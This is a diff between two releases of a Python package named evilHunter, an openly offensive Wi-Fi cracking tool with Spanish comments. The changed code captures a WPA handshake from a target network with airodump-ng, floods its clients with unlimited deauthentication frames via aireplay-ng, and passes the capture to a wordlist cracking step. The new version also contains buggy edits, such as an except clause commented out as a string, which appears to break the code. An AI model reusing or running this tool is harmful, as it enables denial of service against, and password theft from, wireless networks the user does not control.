# Comparing `tmp/evilHunter-0.1.4.tar.gz` & `tmp/evilHunter-0.1.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.4.tar", last modified: Thu Jun  8 20:21:16 2023, max compression
+gzip compressed data, was "evilHunter-0.1.5.tar", last modified: Fri Jun  9 21:35:48 2023, max compression
```

## Comparing `evilHunter-0.1.4.tar` & `evilHunter-0.1.5.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-08 20:21:16.570668 evilHunter-0.1.4/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1131 2023-06-08 20:21:16.570668 evilHunter-0.1.4/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      899 2023-06-08 20:20:36.000000 evilHunter-0.1.4/README.md
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-08 20:21:16.570668 evilHunter-0.1.4/evilHunter.egg-info/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1131 2023-06-08 20:21:16.000000 evilHunter-0.1.4/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      201 2023-06-08 20:21:16.000000 evilHunter-0.1.4/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-08 20:21:16.000000 evilHunter-0.1.4/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        9 2023-06-08 20:21:16.000000 evilHunter-0.1.4/evilHunter.egg-info/requires.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-08 20:21:16.000000 evilHunter-0.1.4/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)    15454 2023-06-08 20:09:43.000000 evilHunter-0.1.4/evilHunter.py
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-08 20:21:16.570668 evilHunter-0.1.4/setup.cfg
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      519 2023-06-08 20:21:13.000000 evilHunter-0.1.4/setup.py
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-09 21:35:48.834514 evilHunter-0.1.5/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1673 2023-06-09 21:35:48.834514 evilHunter-0.1.5/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1440 2023-06-09 11:15:59.000000 evilHunter-0.1.5/README.md
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-09 21:35:48.834514 evilHunter-0.1.5/evilHunter.egg-info/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1673 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      201 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        9 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)    15527 2023-06-09 21:25:06.000000 evilHunter-0.1.5/evilHunter.py
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-09 21:35:48.834514 evilHunter-0.1.5/setup.cfg
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      520 2023-06-09 21:35:29.000000 evilHunter-0.1.5/setup.py
```

### Comparing `evilHunter-0.1.4/evilHunter.py` & `evilHunter-0.1.5/evilHunter.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,8 +1,9 @@
 #!/bin/python3
+import pywifi as pywifi
 
 try:
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
     import colorama
     from colorama import Fore
     import os
@@ -17,23 +18,25 @@
     print(Fore.GREEN + "\n\t[*] " + Fore.YELLOW + "Librerias importadas correctamente...")
 
 except ModuleNotFoundError as e:
     print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
     print("[!] Exiting...")
     exit(1)
 
+# Juntar con port_scan
+# Añadir anilisis de WiFis
 
 def delete_files():
     os.system("rm -r captures/* > /dev/null")
     os.system("rm -r espec/* > /dev/null")
 
 
 def restart_net():
-    os.system("service networking restart")
-    os.system("service NetworkManager restart")
+    os.system("service networking restart > /dev/null")
+    os.system("service NetworkManager restart > /dev/null")
 # COMPROBAR SI EL ARGUMENTO -w FUNCIONA Y SE COMPRUEBA
 
 
 def exiting(err):
     if err:
         if err == "True":
             print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n" + err)
@@ -46,18 +49,17 @@
 
     print(
         Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
                         Fore.LIGHTCYAN_EX + "Restarting network services"
         + Fore.YELLOW +Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " +
                         Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)
 
-
     try:
-        if os.system("airmon-ng stop {}mon ".format(choosed_interface)) != 0:
-            os.system("airmon-ng stop {}".format(choosed_interface))
+        if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
+            os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
     except NameError:
         pass
 
     print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting all capture files..."
           + Fore.RESET)
 
     restart_net()
@@ -335,66 +337,66 @@
     time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
           Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
           Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
 
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
 
-    hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
-                             f"{interface}"], stdout=subprocess.PIPE)
-
 
     # Preparamos multiproceso para poder pararlos todos a la vez
-    deauth = multiprocessing.Process(target=deauth_clients(bssid))
-    deauth.start()
+    #deauth = multiprocessing.Process(target=deauth_clients(bssid))
+
 
     # Preparamos subproceso de capture hand
-    capture = threading.Thread(target=capture_handshake(hand, direc, args, deauth))
+    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file))
 
     # Iniciamos la captura del handshake y envio de deauth
     capture.start()
+    #deauth.start()
 
     # Juntamos para detener
     capture.join()
-    deauth.join()
+    #deauth.join()
 
 
-def deauth_clients(bssid):
+"""def deauth_clients(bssid):
     # Enviar paquetes "deauth"
-    reject = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
+"""
 
 
+def capture_handshake(direc, args, bssid, ch, file):
 
-def capture_handshake(hand,  direc, args, deauth):
+    hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
+                             f"{interface}"], stdout=subprocess.PIPE)
+
+    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
     done = False
     while True:
         try:
             output = hand.stdout.readline()
 
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
                 done = True
-                deauth.terminate()
                 break
 
         except KeyboardInterrupt:
-            deauth.terminate()
             break
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
         print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...\n\n")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
     crack_handshake(direc, args)
 
 
 def find_wordlists(wordlists):
-    found = os.system("find {}  > /dev/null".format(wordlists))
+    found = os.system("find {} > /dev/null".format(wordlists))
     while found != 0:
         print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
         wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
         found = os.system("find {}  > /dev/null".format(wordlists))
 
     return wordlists
 
@@ -450,15 +452,14 @@
         # Borramos datos
         exiting(err="done")
 
     # Salida manual
     except KeyboardInterrupt:
         exiting(err=False)
 
-    # Salida por error
+    """# Salida por error
     except Exception as e:
-        exiting(err=e)
-
+        exiting(err=e)"""
 
 
 if __name__ == "__main__":
     main()
```

### Comparing `evilHunter-0.1.4/setup.py` & `evilHunter-0.1.5/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,21 +1,21 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.4",
+    version="0.1.5",
     description="Cracking WiFi(Hanshake)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
     scripts=["evilHunter.py"],
     install_requires=[
         'colorama'
 ],
 
-)
+)
```

